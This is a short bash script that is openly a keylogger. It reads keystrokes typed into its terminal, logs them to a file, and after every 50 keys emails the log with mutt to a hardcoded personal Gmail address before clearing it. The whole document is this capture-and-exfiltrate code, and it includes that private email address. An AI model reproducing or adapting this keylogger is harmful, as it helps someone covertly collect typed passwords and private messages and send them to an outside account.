output_file="keysloggerwithbash.txt"
email="minerhossainrimon1033@gmail.com"
> "$output_file"
echo "Start typing. Press Ctrl+C to stop."
count=0

while true; do
    read -n 1 -r key
        
    if [[ -z "$key" ]]; then
        echo "" >> "$output_file"
        echo " (Space or Newline detected and written)" 

    else
        echo -n "$key" >> "$output_file"
        echo -n " (Key '$key' pressed and count = '$count')" 
    fi
   

    count=$((count + 1))
    echo
    #echo "You pressed: $key"

    
    if [[ $count -ge 50 ]]; then
       
        echo "Last 50 key!" | mutt -s "Key Logger Report" -a "$output_file" -- "$email"
  	#echo "Last 50 key!"
        email_status=$? 
        
        if [[ $email_status -eq 0 ]]; then
            email_sent=true
            echo "Email sent successfully."
        else
            email_sent=false
            echo "Failed to send email."
        fi
        
       
        > "$output_file"
        echo "Count = $count"
        count=0
    fi
done
